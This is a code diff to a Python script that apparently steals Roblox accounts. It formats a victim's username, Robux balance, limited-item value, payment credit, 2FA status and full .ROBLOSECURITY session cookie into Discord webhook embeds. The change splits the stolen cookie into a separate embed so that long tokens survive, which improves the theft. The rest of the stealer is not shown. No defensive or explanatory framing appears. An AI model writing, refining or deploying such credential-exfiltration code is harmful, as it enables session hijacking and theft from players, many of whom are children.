@@ -225,69 +225,71 @@ def main():
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
         
-        # Format the clean cookie directly as a single block
-        cookie_display = f"```text\n{roblosecurity}\n```"
+        # Embed 1: Account Stats & Overview
+        embed_stats = {
+            "title": f"📢 Discord Notification 📢",
+            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
+            "color": 0x2B2D31,
+            "thumbnail": {"url": avatar_url},
+            "fields": [
+                {
+                    "name": "🐱 Username",
+                    "value": f"```ini\n{username}\n```",
+                    "inline": False
+                },
+                {
+                    "name": "📊 Account Stats",
+                    "value": f"```diff\n+ Account Age: {age_days} Days\n+ Game Visits: {developer}\n+ Group Members: {group_count}\n+ Gamepasses bought: {gamepasses_bought}\n```",
+                    "inline": False
+                },
+                {
+                    "name": "🪙 Robux",
+                    "value": f"```ini\nBalance: {robux:,}\nPending: {pending:,}\n```",
+                    "inline": True
+                },
+                {
+                    "name": "💎 Limiteds",
+                    "value": f"```ini\nRAP: {rap:,}\nLimiteds: {lim_count}\n```",
+                    "inline": True
+                },
+                {
+                    "name": "🚀 Summary",
+                    "value": f"```ini\n{rap + robux:,}\n```",
+                    "inline": True
+                },
+                {
+                    "name": "🔥 Payments",
+                    "value": f"```diff\n- Paid: {premium}\nCredit: {credit:.2f} {currency}\n```",
+                    "inline": True
+                },
+                {
+                    "name": "⭐ Games",
+                    "value": f"```diff\n+ Murder Mystery 2: {mm2}\n- Pet Simulator 99: {ps99}\n- Adopt Me: {adopt_me}\n```",
+                    "inline": True
+                },
+                {
+                    "name": "🛡️ Settings",
+                    "value": f"```diff\n+ Email: {'Verified' if email_ver else 'False'}\n+ 2FA: {'Set' if twofa else 'False'}\n```",
+                    "inline": True
+                }
+            ],
+            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
+            "timestamp": datetime.now(timezone.utc).isoformat()
+        }
 
+        # Embed 2: Cookie Alone (Placed in description to handle large lengths safely)
+        embed_cookie = {
+            "title": "🍪 Session Cookie Data",
+            "description": f"```text\n{roblosecurity}\n```",
+            "color": 0x2B2D31,
+            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
+        }
+
+        # Combine both into the payload embeds array
         payload = {
             "username": f"{display_name} | Stats",
             "avatar_url": avatar_url,
-            "embeds": [
-                {
-                    "title": f"📢 Discord Notification 📢",
-                    "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
-                    "color": 0x2B2D31,
-                    "thumbnail": {"url": avatar_url},
-                    "fields": [
-                        {
-                            "name": "🐱 Username",
-                            "value": f"```ini\n{username}\n```",
-                            "inline": False
-                        },
-                        {
-                            "name": "📊 Account Stats",
-                            "value": f"```diff\n+ Account Age: {age_days} Days\n+ Game Visits: {developer}\n+ Group Members: {group_count}\n+ Gamepasses bought: {gamepasses_bought}\n```",
-                            "inline": False
-                        },
-                        {
-                            "name": "🪙 Robux",
-                            "value": f"```ini\nBalance: {robux:,}\nPending: {pending:,}\n```",
-                            "inline": True
-                        },
-                        {
-                            "name": "💎 Limiteds",
-                            "value": f"```ini\nRAP: {rap:,}\nLimiteds: {lim_count}\n```",
-                            "inline": True
-                        },
-                        {
-                            "name": "🚀 Summary",
-                            "value": f"```ini\n{rap + robux:,}\n```",
-                            "inline": True
-                        },
-                        {
-                            "name": "🔥 Payments",
-                            "value": f"```diff\n- Paid: {premium}\nCredit: {credit:.2f} {currency}\n```",
-                            "inline": True
-                        },
-                        {
-                            "name": "⭐ Games",
-                            "value": f"```diff\n+ Murder Mystery 2: {mm2}\n- Pet Simulator 99: {ps99}\n- Adopt Me: {adopt_me}\n```",
-                            "inline": True
-                        },
-                        {
-                            "name": "🛡️ Settings",
-                            "value": f"```diff\n+ Email: {'Verified' if email_ver else 'False'}\n+ 2FA: {'Set' if twofa else 'False'}\n```",
-                            "inline": True
-                        },
-                        {
-                            "name": "🍪 Session Cookie",
-                            "value": cookie_display,
-                            "inline": False
-                        }
-                    ],
-                    "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
-                    "timestamp": datetime.now(timezone.utc).isoformat()
-                }
-            ]
+            "embeds": [embed_stats, embed_cookie]
         }
 
         max_retries = 3
